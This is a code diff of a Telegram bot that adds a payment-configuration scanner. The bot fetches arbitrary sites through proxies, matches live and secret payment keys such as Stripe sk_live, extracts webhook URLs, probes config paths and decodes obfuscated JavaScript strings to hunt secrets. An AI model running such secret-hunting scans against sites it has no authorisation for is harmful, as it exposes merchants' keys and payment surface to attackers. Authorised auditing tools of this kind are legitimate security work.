+        (re.compile(r'www\.paypalobjects\.com'), "PayPal Legacy"),
+        (re.compile(r'js\.razorpay\.com'),       "Razorpay JS"),
+        (re.compile(r'js\.squareup\.com'),       "Square Web SDK"),
+        (re.compile(r'checkout\.adyen\.com'),    "Adyen Web"),
+        (re.compile(r'x\.klarnacdn\.net'),       "Klarna JS"),
+        (re.compile(r'buy\.paddle\.com'),        "Paddle.js"),
+        (re.compile(r'mollie\.com'),              "Mollie JS"),
+        (re.compile(r'paystack\.com/popup'),      "Paystack Popup"),
+        (re.compile(r'flutterwave\.com'),         "Flutterwave JS"),
+        (re.compile(r'checkout\.com'),            "Checkout.com"),
+        (re.compile(r'pay\.google\.com'),        "Google Pay API"),
+        (re.compile(r'apple(?:pay)?\.com'),       "Apple Pay"),
+        (re.compile(r'shop\.app/pay'),            "Shop Pay"),
+        (re.compile(r'cashfree\.com'),            "Cashfree"),
+        (re.compile(r'payu\.in|payu\.com'),      "PayU"),
+        (re.compile(r'coinbase\.com/commerce'),   "Coinbase Commerce"),
+    ]
+    sdk_seen = set()
+    for pat, sdk_name in _SDK_PATTERNS:
+        if pat.search(html) and sdk_name not in sdk_seen:
+            sdk_seen.add(sdk_name)
+            result["sdk_scripts"].append(sdk_name)
+    result["gateways"] = list(set(result["sdk_scripts"] + result["csp_gateways"]))
+
+    # ── 5. Key mode detection (live vs test) ──────────────────────────────────
+    if progress_cb: progress_cb("🔑 Detecting payment key modes (live/test)...")
+    _KEY_MODE_PATS = [
+        (re.compile(r'\b(pk_live_[A-Za-z0-9]{20,60})\b'),  "Stripe Live PK", True),
+        (re.compile(r'\b(pk_test_[A-Za-z0-9]{20,60})\b'),  "Stripe Test PK", False),
+        (re.compile(r'\b(sk_live_[A-Za-z0-9]{20,60})\b'),  "Stripe Live SK ⚠️", True),
+        (re.compile(r'\b(sk_test_[A-Za-z0-9]{20,60})\b'),  "Stripe Test SK", False),
+        (re.compile(r'\b(rzp_live_[A-Za-z0-9]{14,20})\b'), "Razorpay Live", True),
+        (re.compile(r'\b(rzp_test_[A-Za-z0-9]{14,20})\b'), "Razorpay Test", False),
+        (re.compile(r'\b(FLWPUBK-[A-Za-z0-9]+-X)\b'),      "Flutterwave Live PK", True),
+        (re.compile(r'\b(FLWPUBK_TEST-[A-Za-z0-9]+-X)\b'), "Flutterwave Test PK", False),
+        (re.compile(r'\b(pk_(?:sbox|prod)_[A-Za-z0-9]{20,80})\b'), "Checkout.com Key", None),
+        (re.compile(r'\b(pdl_live_[A-Za-z0-9_]{20,80})\b'), "Paddle Live", True),
+        (re.compile(r'\b(pdl_sbox_[A-Za-z0-9_]{20,80})\b'), "Paddle Sandbox", False),
+    ]
+    mode_seen = set()
+    for pat, label, is_live in _KEY_MODE_PATS:
+        for m in pat.finditer(combined):
+            val = m.group(1)
+            key = label + ":" + val[:20]
+            if key in mode_seen:
+                continue
+            mode_seen.add(key)
+            masked = val[:12] + "..." + val[-4:] if len(val) > 16 else val
+            entry = {"label": label, "masked": masked}
+            if is_live is True:
+                result["key_modes"]["live"].append(entry)
+            elif is_live is False:
+                result["key_modes"]["test"].append(entry)
+            else:
+                result["key_modes"]["unknown"].append(entry)
+
+    # ── 6. Currency / locale detection ────────────────────────────────────────
+    if progress_cb: progress_cb("💱 Detecting currencies + locales...")
+    currency_seen = set()
+    for m in _CURRENCY_RE.finditer(combined):
+        val = (m.group(1) or m.group(2) or "").upper()
+        if val and len(val) <= 4 and val.isalpha() and val not in currency_seen:
+            currency_seen.add(val)
+    result["currencies"] = sorted(currency_seen)[:20]
+
+    # ── 7. Webhook / callback URL extraction ─────────────────────────────────
+    if progress_cb: progress_cb("🔗 Extracting webhook + callback URLs...")
+    wh_seen = set()
+    for wh_type, pat in _WEBHOOK_PATTERNS:
+        for m in pat.finditer(combined):
+            wh_url = m.group(1).strip().strip('"\' ')
+            key    = wh_url[:80]
+            if key not in wh_seen and "example" not in key.lower():
+                wh_seen.add(key)
+                result["webhooks"].append({"type": wh_type, "url": wh_url[:100]})
+
+    # ── 8. Form field fingerprint ─────────────────────────────────────────────
+    if progress_cb: progress_cb("📋 Fingerprinting payment form fields...")
+    for field_name, pat in _FORM_FIELD_SIGNALS.items():
+        if pat.search(html):   # only HTML for real form fields
+            result["form_fields"].append(field_name)
+
+    # ── 9. 3DS / SCA signal detection ────────────────────────────────────────
+    _3DS_QUICK = [
+        (re.compile(r'(?i)stripe\.confirmPayment|stripe\.handleNextAction|authenticateSource'), "Stripe 3DS confirmPayment"),
+        (re.compile(r'(?i)stripe\.confirmCardPayment'),        "Stripe confirmCardPayment"),
+        (re.compile(r'(?i)paymentIntent\.status.*requires_action'), "PaymentIntent requires_action"),
+        (re.compile(r'(?i)threeDS(?:Method|Result|Fingerprint)'), "Adyen/Generic 3DS fingerprint"),
+        (re.compile(r'(?i)3d.?secure|three.?d.?secure'),         "3D Secure reference"),
+        (re.compile(r'(?i)\.redirect(?:To)?3ds'),               "redirect3DS call"),
+        (re.compile(r'(?i)authentication_required'),             "authentication_required status"),
+        (re.compile(r'(?i)sca[_\-]?(?:required|enforcement|challenge)'), "SCA enforcement"),
+    ]
+    for pat, label in _3DS_QUICK:
+        if pat.search(combined) and label not in result["threeds"]:
+            result["threeds"].append(label)
+
+    # ── 10. PCI risk scan ─────────────────────────────────────────────────────
+    _PCI_QUICK = [
+        (re.compile(r'(?i)document\.getElementById.*card.?number'),
+         "⚠️ Raw card number input in DOM — SAQ D scope"),
+        (re.compile(r'(?i)localStorage\.setItem.*(?:card|payment|stripe|token)'),
+         "⚠️ Payment data stored in localStorage"),
+        (re.compile(r'(?i)console\.log.*(?:sk_|pk_|secret)'),
+         "⚠️ Payment key logged to console"),
+        (re.compile(r'(?i)http://(?!localhost).*(?:checkout|payment|pay)'),
+         "⚠️ Non-HTTPS payment page link detected"),
+        (re.compile(r'(?i)cvv|cvc|security.?code'),
+         "⚠️ CVV/CVC field present — PCI scope applies"),
+        (re.compile(r'(?i)eval\s*\(|Function\s*\(["\']return'),
+         "⚠️ eval() in JS — obfuscation risk"),
+    ]
+    for pat, note in _PCI_QUICK:
+        if pat.search(combined) and note not in result["pci_risks"]:
+            result["pci_risks"].append(note)
+
+    # ── 11. PCI SAQ estimate ──────────────────────────────────────────────────
+    result["pci_saq"] = _pci_saq_estimate(
+        result["form_fields"], result["gateways"], result["csp_gateways"]
+    )
+
+    return result
+
+
+@user_guard
+async def cmd_payconfig(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/payconfig <url> — Payment integration configuration auditor"""
+    if not await check_force_join(update, context):
+        return
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/payconfig https://example.com`\n\n"
+            "🔍 *Payment Config Auditor — scans:*\n"
+            "  • Payment SDK scripts (20+ gateways fingerprint)\n"
+            "  • CSP header → payment domain whitelist\n"
+            "  • Key mode detection: 🔴 LIVE vs 🟢 TEST\n"
+            "  • Currencies / locales detected\n"
+            "  • Webhook + callback URLs exposed\n"
+            "  • Payment form field structure\n"
+            "  • 3DS / SCA enforcement signals\n"
+            "  • PCI SAQ scope estimate (A / A-EP / D)\n"
+            "  • Security headers audit (CSP, HSTS, X-Frame)\n"
+            "  • Deobfuscation pass over all JS bundles\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith("http"):
+        url = "https://" + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    domain = urlparse(url).netloc
+    msg = await update.effective_message.reply_text(
+        f"💳 *Payment Config Auditor*\n"
+        f"🌐 `{escape_md(domain)}`\n\n"
+        "⏳ Scanning payment integration surface...",
+        parse_mode='Markdown'
+    )
+
+    progress_q = []
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                t = progress_q[-1]; progress_q.clear()
+                try:
+                    await msg.edit_text(
+                        f"💳 *Pay Config — `{escape_md(domain)}`*\n\n{escape_md(t)}",
+                        parse_mode='Markdown'
+                    )
+                except Exception:
+                    pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        result = await run_scan(
+            uid, _payconfig_sync, url, lambda t: progress_q.append(t)
+        )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped", parse_mode='Markdown')
+        return
+    except Exception as e:
+        prog.cancel()
+        await msg.edit_text(f"❌ `{escape_md(str(e))}`", parse_mode='Markdown')
+        return
+    finally:
+        prog.cancel()
+
+    if result.get("error"):
+        await safe_markdown_reply(msg, f"❌ `{escape_md(result['error'])}`")
+        return
+
+    live_count  = len(result["key_modes"]["live"])
+    test_count  = len(result["key_modes"]["test"])
+    vuln_pci    = len(result["pci_risks"])
+    overall_env = ("🔴 LIVE" if live_count else "🟢 TEST" if test_count else "⚪ UNKNOWN")
+
+    lines = [
+        f"💳 *Payment Config Audit — `{escape_md(domain)}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
+        f"🌐 `{escape_md(result['page_url'][:80])}`",
+        f"🏦 Gateways: `{len(result['gateways'])}` detected | Mode: *{overall_env}*",
+        f"⚠️ PCI Risks: `{vuln_pci}` | 3DS signals: `{len(result['threeds'])}`",
+        "",
+    ]
+
+    # SDKs
+    if result["sdk_scripts"]:
+        lines.append("*🏦 Payment SDK Scripts:*")
+        for gw in result["sdk_scripts"]:
+            lines.append(f"  ✅ {gw}")
+        lines.append("")
+
+    # CSP gateways
+    if result["csp_gateways"]:
+        lines.append("*🔐 CSP-Whitelisted Gateways:*")
+        for gw in result["csp_gateways"]:
+            lines.append(f"  📋 {gw}")
+        lines.append("")
+
+    # Key modes
+    if result["key_modes"]["live"] or result["key_modes"]["test"]:
+        lines.append("*🔑 Key Mode Fingerprint:*")
+        for e in result["key_modes"]["live"][:5]:
+            _m = e["masked"].replace("`", "'")
+            lines.append(f"  🔴 LIVE — {escape_md(e['label'])} `{_m}`")
+        for e in result["key_modes"]["test"][:5]:
+            lines.append(f"  🟢 TEST — {escape_md(e['label'])}")
+        for e in result["key_modes"]["unknown"][:3]:
+            lines.append(f"  ⚪ UNKN — {escape_md(e['label'])}")
+        lines.append("")
+
+    # Currencies
+    if result["currencies"]:
+        _cur = escape_md(", ".join(result["currencies"][:15]))
+        lines.append(f"*💱 Currencies detected:* `{_cur}`")
+        lines.append("")
+
+    # Webhook URLs
+    if result["webhooks"]:
+        lines.append(f"*🔗 Webhook / Callback URLs ({len(result['webhooks'])}):*")
+        for wh in result["webhooks"][:6]:
+            _wu = wh["url"][:70].replace("`", "'")
+            lines.append(f"  {escape_md(wh['type'])}: `{_wu}`")
+        lines.append("")
+
+    # Form fields
+    if result["form_fields"]:
+        lines.append("*📋 Payment Form Fields:*")
+        for ff in result["form_fields"]:
+            lines.append(f"  📄 {ff}")
+        lines.append("")
+
+    # 3DS signals
+    if result["threeds"]:
+        lines.append("*🔒 3DS / SCA Signals:*")
+        for s in result["threeds"][:5]:
+            lines.append(f"  ✅ {escape_md(s)}")
+        lines.append("")
+
+    # PCI risks
+    if result["pci_risks"]:
+        lines.append("*🚨 PCI Risk Findings:*")
+        for r in result["pci_risks"][:6]:
+            lines.append(f"  {escape_md(r)}")
+        lines.append("")
+
+    # PCI SAQ
+    if result["pci_saq"]:
+        lines.append(f"*🏷️ PCI SAQ Estimate:*\n  {escape_md(result['pci_saq'])}")
+        lines.append("")
+
+    # Security headers
+    if result["security_headers"]:
+        lines.append("*🛡️ Security Headers:*")
+        for k, v in result["security_headers"].items():
+            _v = v[:60].replace("`", "'")
+            lines.append(f"  `{escape_md(k)}`: _{escape_md(_v)}_")
+        lines.append("")
+
+    lines += [
+        "━━━━━━━━━━━━━━━━━━",
+        "⚠️ _Authorized testing only_",
+    ]
+
+    await safe_markdown_reply(msg, _truncate_safe_md("\n".join(lines)))
+
+    import io as _io
+    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_d = re.sub(r'[^\w\-]', '_', domain)
+    try:
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=_io.BytesIO(json.dumps({
+                "domain":             domain,
+                "page_url":           result["page_url"],
+                "scanned_at":         datetime.now().isoformat(),
+                "gateways":           result["gateways"],
+                "sdk_scripts":        result["sdk_scripts"],
+                "csp_gateways":       result["csp_gateways"],
+                "key_modes":          result["key_modes"],
+                "currencies":         result["currencies"],
+                "webhooks":           result["webhooks"],
+                "form_fields":        result["form_fields"],
+                "threeds_signals":    result["threeds"],
+                "pci_risks":          result["pci_risks"],
+                "pci_saq_estimate":   result["pci_saq"],
+                "security_headers":   result["security_headers"],
+            }, indent=2, ensure_ascii=False).encode()),
+            filename=f"payconfig_{safe_d}_{ts}.json",
+            caption=(
+                f"💳 Payment Config — `{escape_md(domain)}`\n"
+                f"🏦 Gateways: `{len(result['gateways'])}` | Mode: {overall_env} | PCI risks: `{vuln_pci}`"
+            ),
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.warning("payconfig export error: %s", e)
+
 @user_guard
 async def cmd_entropy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """/entropy <url> [threshold] — High entropy secret hunter"""
@@ -11577,9 +12243,13 @@ async def cmd_entropy(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(
-            _entropy_hunt_sync, url, threshold, lambda t: progress_q.append(t)
+        result = await run_scan(
+            uid, _entropy_hunt_sync, url, threshold, lambda t: progress_q.append(t)
         )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped", parse_mode='Markdown')
+        return
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(str(e))}`", parse_mode='Markdown')
@@ -11863,9 +12533,13 @@ async def cmd_deobfuscate(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(
-            _deobfuscate_sync, url, lambda t: progress_q.append(t)
+        result = await run_scan(
+            uid, _deobfuscate_sync, url, lambda t: progress_q.append(t)
         )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped", parse_mode='Markdown')
+        return
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(str(e))}`", parse_mode='Markdown')
@@ -11945,476 +12619,6 @@ async def cmd_deobfuscate(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     except Exception as e:
         logger.warning("deobfuscate export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🧩  SHARED — Deobfuscation layer (called by sitekey/keydump/paykeys)
-# ══════════════════════════════════════════════════
-
-def _deobfuscate_layer(texts_map: dict, progress_cb=None) -> list:
-    """
-    Pre-fetched JS text တွေပေါ် deobfuscation scan ပြုလုပ်တယ်။
-    sitekey / keydump / paykeys ရဲ့ already-fetched JS ကို reuse လုပ်တာမို့
-    ထပ်ခါ network request မလုပ်တော့ပါ။
-
-    Returns: list of finding dicts — method, raw, decoded, entropy, source, context
-    """
-    import base64 as _b64
-
-    _SECRET_KW = re.compile(
-        r'(?i)(key|secret|token|api|auth|pass|cred|private|access|'
-        r'sk_|pk_|AKIA|bearer|webhook|signing|encrypt|password|client_secret)',
-    )
-    seen_decoded: set = set()
-    findings: list   = []
-
-    def _ent(s: str) -> float:
-        if not s: return 0.0
-        import math
-        freq = {}
-        for c in s: freq[c] = freq.get(c, 0) + 1
-        l = len(s)
-        return -sum(v/l * math.log2(v/l) for v in freq.values())
-
-    def _record(method: str, raw: str, decoded: str, source: str, ctx: str = ""):
-        val = decoded.strip()
-        if val in seen_decoded or len(val) < 8: return
-        score = _ent(val)
-        if score < 3.5: return
-        seen_decoded.add(val)
-        findings.append({
-            "method":            method,
-            "raw":               raw[:80],
-            "decoded":           val[:120],
-            "entropy":           round(score, 3),
-            "source":            source,
-            "context":           ctx[:80],
-            "in_secret_context": bool(_SECRET_KW.search(ctx + raw)),
-        })
-
-    for source, text in texts_map.items():
-        if not isinstance(text, str) or len(text) < 20:
-            continue
-
-        # ── 1. Base64 atob() / Buffer.from(...,'base64') ─────────────────
-        for m in re.finditer(
-            r'(?:atob|Buffer\.from)\s*\(\s*["\']([A-Za-z0-9+/]{12,}={0,2})["\']', text
-        ):
-            raw = m.group(1)
-            try:
-                decoded = _b64.b64decode(raw + "==").decode("utf-8", errors="replace")
-                _record("Base64 atob()", raw, decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 2. Hex escape \x73\x6b... ────────────────────────────────────
-        for m in re.finditer(r'"((?:\\x[0-9a-fA-F]{2}){6,})"', text):
-            raw = m.group(1)
-            try:
-                decoded = re.sub(r'\\x([0-9a-fA-F]{2})',
-                                 lambda hm: chr(int(hm.group(1), 16)), raw)
-                _record("Hex \\x", raw[:80], decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 3. Raw hex string ─────────────────────────────────────────────
-        for m in re.finditer(r'["\']([0-9a-fA-F]{32,128})["\']', text):
-            raw = m.group(1)
-            if len(raw) % 2 != 0: continue
-            try:
-                decoded = bytes.fromhex(raw).decode("utf-8", errors="replace")
-                if decoded.isprintable() and _SECRET_KW.search(decoded):
-                    _record("Raw Hex", raw, decoded, source,
-                            text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 4. Unicode escape \u0073\u006b... ────────────────────────────
-        for m in re.finditer(r'"((?:\\u[0-9a-fA-F]{4}){5,})"', text):
-            raw = m.group(1)
-            try:
-                decoded = raw.encode('utf-8').decode('unicode_escape')
-                _record("Unicode \\u", raw[:80], decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 5. Array join() trick ["sk","_live","_xx"].join("") ──────────
-        for m in re.finditer(
-            r'\[([^\]]{10,300})\]\s*\.join\s*\(\s*["\']["\']?\s*\)', text
-        ):
-            raw = m.group(1)
-            try:
-                parts   = re.findall(r'["\']([^"\']*)["\']', raw)
-                decoded = "".join(parts)
-                _record("Array join()", raw[:80], decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 6. String.fromCharCode(115,107,95,...) ───────────────────────
-        for m in re.finditer(r'String\.fromCharCode\(([0-9,\s]{10,300})\)', text):
-            raw = m.group(1)
-            try:
-                codes   = [int(c.strip()) for c in raw.split(",") if c.strip().isdigit()]
-                decoded = "".join(chr(c) for c in codes if 32 <= c < 127)
-                _record("fromCharCode", raw[:80], decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 7. Reverse string "...".split("").reverse().join("") ─────────
-        for m in re.finditer(
-            r'["\']([A-Za-z0-9+/=_\-]{16,120})["\']'
-            r'\s*\.split\s*\(\s*["\']["\']?\s*\)\s*\.reverse\(\)\s*\.join\s*\(\s*["\']["\']?\s*\)',
-            text
-        ):
-            raw = m.group(1)
-            try:
-                decoded = raw[::-1]
-                _record("Reversed string", raw[:80], decoded, source,
-                        text[max(0, m.start()-60): m.start()+60])
-            except Exception:
-                pass
-
-        # ── 8. btoa-encoded segments: split("").map(c=>c.charCodeAt(0)) ──
-        for m in re.finditer(
-            r'\.map\s*\(\s*(?:function\s*\(\s*\w+\s*\)|[\w]+\s*=>)\s*'
-            r'\w+\.charCodeAt\s*\(\s*0\s*\)\s*[+\-]\s*(\d+)\s*\)',
-            text
-        ):
-            # Caesar / ROT-N shift detection
-            try:
-                shift = int(m.group(1))
-                ctx   = text[max(0, m.start()-120): m.start()+120]
-                str_m = re.search(r'["\']([A-Za-z0-9+/=_\-]{16,})["\']', ctx)
-                if str_m:
-                    raw     = str_m.group(1)
-                    decoded = "".join(chr(max(0, ord(c) - shift)) for c in raw)
-                    _record(f"Caesar-{shift}", raw[:80], decoded, source, ctx[:80])
-            except Exception:
-                pass
-
-    findings.sort(key=lambda x: (-int(x["in_secret_context"]), -x["entropy"]))
-    if progress_cb:
-        progress_cb(f"🧩 Deobfuscate: {len(findings)} decoded string(s) found")
-    return findings
-
-
-# ══════════════════════════════════════════════════
-# 💳  /payconfig — Payment Gateway Public Config Extractor
-# ══════════════════════════════════════════════════
-
-# JS-source patterns for gateway SDK init config objects (public/frontend only)
-_PAYCONFIG_PATTERNS = [
-    # Stripe
-    ("Stripe",     "publishableKey",  re.compile(r'Stripe\s*\(\s*["\']([^"\']{10,80})["\']', re.I)),
-    ("Stripe",     "stripeAccount",   re.compile(r'stripeAccount\s*:\s*["\']([^"\']{5,40})["\']', re.I)),
-    ("Stripe",     "locale",          re.compile(r'(?:Stripe\b.{0,200})locale\s*:\s*["\']([a-z\-]{2,10})["\']', re.I|re.S)),
-    ("Stripe",     "currency",        re.compile(r'(?:Stripe\b.{0,200})currency\s*:\s*["\']([a-z]{3})["\']', re.I|re.S)),
-    ("Stripe",     "apiVersion",      re.compile(r'apiVersion\s*:\s*["\'](\d{4}-\d{2}-\d{2})["\']', re.I)),
-
-    # PayPal
-    ("PayPal",     "clientId",        re.compile(r'client[-_]?id\s*[=:]\s*["\']([A-Za-z0-9\-_]{10,80})["\']', re.I)),
-    ("PayPal",     "currency",        re.compile(r'(?:paypal|PAYPAL).{0,300}currency\s*:\s*["\']([A-Z]{3})["\']', re.I|re.S)),
-    ("PayPal",     "intent",          re.compile(r'intent\s*:\s*["\']([a-z]+)["\']', re.I)),
-    ("PayPal",     "merchantId",      re.compile(r'merchant[-_]?id\s*[=:]\s*["\']([A-Za-z0-9\-_]{5,60})["\']', re.I)),
-
-    # Braintree
-    ("Braintree",  "authorization",   re.compile(r'(?:braintree|dropin).{0,100}authorization\s*:\s*["\']([^"\']{10,120})["\']', re.I|re.S)),
-    ("Braintree",  "container",       re.compile(r'container\s*:\s*["\']([^"\']{1,60})["\']', re.I)),
-
-    # Square
-    ("Square",     "applicationId",   re.compile(r'applicationId\s*[=:]\s*["\']([A-Za-z0-9\-_]{10,60})["\']', re.I)),
-    ("Square",     "locationId",      re.compile(r'locationId\s*[=:]\s*["\']([A-Za-z0-9]{8,30})["\']', re.I)),
-    ("Square",     "environment",     re.compile(r'(?:square|Square).{0,100}environment\s*[=:]\s*["\']([a-z]+)["\']', re.I|re.S)),
-
-    # Razorpay (public config fields only — key_id prefix rzp_ is public)
-    ("Razorpay",   "key_id",          re.compile(r'["\']?key[_\s]?id["\']?\s*[=:]\s*["\']?(rzp_(?:live|test)_[A-Za-z0-9]{14,})["\']?', re.I)),
-    ("Razorpay",   "currency",        re.compile(r'(?:Razorpay|razorpay).{0,200}currency\s*[=:]\s*["\']([A-Z]{3})["\']', re.I|re.S)),
-    ("Razorpay",   "name",            re.compile(r'(?:Razorpay|razorpay).{0,200}name\s*[=:]\s*["\']([^"\']{2,60})["\']', re.I|re.S)),
-    ("Razorpay",   "theme_color",     re.compile(r'theme\s*[=:]\s*\{[^}]*color\s*[=:]\s*["\']([^"\']{3,20})["\']', re.I|re.S)),
-
-    # Adyen
-    ("Adyen",      "environment",     re.compile(r'(?:AdyenCheckout|adyen).{0,100}environment\s*[=:]\s*["\']([a-zA-Z]+)["\']', re.I|re.S)),
-    ("Adyen",      "clientKey",       re.compile(r'clientKey\s*[=:]\s*["\']([^"\']{10,80})["\']', re.I)),
-    ("Adyen",      "countryCode",     re.compile(r'countryCode\s*[=:]\s*["\']([A-Z]{2})["\']', re.I)),
-    ("Adyen",      "currency",        re.compile(r'(?:AdyenCheckout|adyen).{0,200}currency\s*[=:]\s*["\']([A-Z]{3})["\']', re.I|re.S)),
-
-    # Klarna
-    ("Klarna",     "client_id",       re.compile(r'(?:Klarna|klarna).{0,100}client[-_]?id\s*[=:]\s*["\']([^"\']{8,60})["\']', re.I|re.S)),
-    ("Klarna",     "purchase_country",re.compile(r'purchase_country\s*[=:]\s*["\']([A-Z]{2})["\']', re.I)),
-    ("Klarna",     "purchase_currency",re.compile(r'purchase_currency\s*[=:]\s*["\']([A-Z]{3})["\']', re.I)),
-
-    # Mollie
-    ("Mollie",     "profileId",       re.compile(r'profileId\s*[=:]\s*["\']([^"\']{5,40})["\']', re.I)),
-
-    # Paddle
-    ("Paddle",     "vendorId",        re.compile(r'(?:Paddle|paddle).{0,100}vendor(?:Id|ID)\s*[=:]\s*["\']?(\d{4,10})["\']?', re.I|re.S)),
-    ("Paddle",     "environment",     re.compile(r'(?:Paddle|paddle).{0,100}environment\s*[=:]\s*["\']([a-z]+)["\']', re.I|re.S)),
-
-    # Paystack
-    ("Paystack",   "key",             re.compile(r'(?:PaystackPop|paystack).{0,100}key\s*[=:]\s*["\']([^"\']{10,60})["\']', re.I|re.S)),
-    ("Paystack",   "currency",        re.compile(r'(?:PaystackPop|paystack).{0,200}currency\s*[=:]\s*["\']([A-Z]{3})["\']', re.I|re.S)),
-]
-
-
-def _payconfig_sync(url: str, progress_cb=None) -> dict:
-    """
-    Payment gateway SDK init config ကို JS source ထဲမှ ထုတ်ယူတယ်။
-    Frontend/public config fields သာ — API key/secret မဟုတ်ပါ။
-    """
-    if progress_cb: progress_cb("🌐 Fetching page HTML...")
-
-    try:
-        proxy    = proxy_manager.get_proxy()
-        resp     = requests.get(url, headers=HEADERS, proxies=proxy,
-                                timeout=TIMEOUT, verify=False)
-        html     = resp.text
-        final_url = resp.url
-    except Exception as e:
-        return {"error": str(e), "findings": {}, "js_count": 0}
-
-    texts_map: dict = {"[HTML]": html}
-
-    # Collect JS bundle URLs
-    js_urls: list = []
-    for src in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I):
-        abs_src = urljoin(final_url, src)
-        if abs_src.startswith("http"):
-            js_urls.append(abs_src)
-
-    if progress_cb: progress_cb(f"📦 Fetching {len(js_urls)} JS bundles...")
-    for js_url in js_urls[:30]:
-        try:
-            r = requests.get(js_url, headers=HEADERS,
-                             proxies=proxy_manager.get_proxy(),
-                             timeout=TIMEOUT, verify=False)
-            if r.status_code == 200 and len(r.text) < 5_000_000:
-                key = js_url.split("/")[-1][:40] or js_url[-40:]
-                texts_map[key] = r.text
-        except Exception:
-            pass
-
-    # Also try known public config endpoints
-    config_paths = [
-        "/payment-config.json", "/checkout-config.json",
-        "/static/payment.js",   "/assets/checkout.js",
-        "/js/payment.js",       "/__payment_config",
-    ]
-    for path in config_paths:
-        try:
-            r = requests.get(urljoin(final_url, path), headers=HEADERS,
-                             proxies=proxy_manager.get_proxy(),
-                             timeout=8, verify=False)
-            if r.status_code == 200 and len(r.text) < 2_000_000:
-                texts_map[path] = r.text
-        except Exception:
-            pass
-
-    if progress_cb: progress_cb("🔍 Extracting gateway SDK config objects...")
-
-    # gateway → {field: [values]}, gw_sources → {gateway: {field: [{source_url, found_via}]}}
-    gw_configs: dict = {}
-    gw_sources: dict = {}
-
-    for file_label, text in texts_map.items():
-        # Resolve source_url per file
-        if file_label.startswith("http"):
-            file_src_url = file_label
-            found_via    = "JS static"
-        elif file_label.startswith("/"):
-            file_src_url = urljoin(final_url, file_label)
-            found_via    = "config endpoint"
-        else:
-            file_src_url = final_url
-            found_via    = "HTML inline" if file_label == "[HTML]" else "JS static"
-
-        for gateway, field, pattern in _PAYCONFIG_PATTERNS:
-            for m in pattern.finditer(text):
-                val = m.group(1).strip()
-                if not val or len(val) < 2:
-                    continue
-                if gateway not in gw_configs:
-                    gw_configs[gateway] = {}
-                    gw_sources[gateway] = {}
-                if field not in gw_configs[gateway]:
-                    gw_configs[gateway][field] = []
-                    gw_sources[gateway][field] = []
-                if val not in gw_configs[gateway][field]:
-                    gw_configs[gateway][field].append(val)
-                    gw_sources[gateway][field].append({
-                        "source_url": file_src_url,
-                        "found_via":  found_via,
-                    })
-
-    # Also run deobfuscate layer to catch hidden config values
-    if progress_cb: progress_cb("🧩 Running deobfuscation layer...")
-    deob = _deobfuscate_layer(texts_map, progress_cb)
-    # Classify deobfuscated results back into gateway buckets if recognizable
-    for f in deob:
-        dec = f.get("decoded", "")
-        if re.match(r'^pk_(live|test)_', dec):
-            gw_configs.setdefault("Stripe", {}).setdefault("decoded_publishable", []).append(dec[:40])
-        elif re.match(r'^rzp_(live|test)_', dec):
-            gw_configs.setdefault("Razorpay", {}).setdefault("decoded_key_id", []).append(dec[:40])
-        elif re.match(r'^[A-Z]{2}\d{6}[A-Z0-9]{10,}$', dec):
-            gw_configs.setdefault("Adyen", {}).setdefault("decoded_clientKey", []).append(dec[:40])
-
-    return {
-        "error":      None,
-        "page_url":   final_url,
-        "js_count":   len(texts_map) - 1,
-        "findings":   gw_configs,
-        "sources":    gw_sources,
-        "deob_count": len(deob),
-    }
-
-
-async def cmd_payconfig(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/payconfig <url> — Extract payment gateway SDK public config from JS source"""
-    if not await check_force_join(update, context): return
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/payconfig https://example.com`\n\n"
-            "⚙️ *Payment SDK Config Extractor:*\n"
-            "  JS source ထဲမှ payment gateway public init config ထုတ်ယူသည်\n\n"
-            "💳 *Supported gateways:*\n"
-            "  🔵 Stripe  🟡 PayPal  🟠 Braintree  🟣 Square\n"
-            "  🔴 Razorpay  🟢 Adyen  🟤 Klarna  ⚫ Mollie\n"
-            "  🔵 Paddle  🟠 Paystack\n\n"
-            "🔍 *Extracts (frontend/public fields only):*\n"
-            "  publishableKey · clientId · merchantId · locationId\n"
-            "  applicationId · currency · locale · environment\n"
